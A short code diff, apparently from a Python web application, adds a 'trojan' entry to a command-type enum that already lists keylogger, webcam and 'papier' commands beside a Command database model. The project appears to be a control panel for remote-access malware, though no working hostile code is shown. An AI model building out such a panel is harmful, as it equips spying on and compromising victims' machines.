@@ -11,7 +11,7 @@ class CommandType(Enum):
     KEYLOGGER = "keylogger"
     PAPIER = "papier"
     WEBCAM = "webcam"
-
+    TROJAN = "trojan"
 
 class Command(db.Model):
     id = db.Column(db.Integer, primary_key=True)
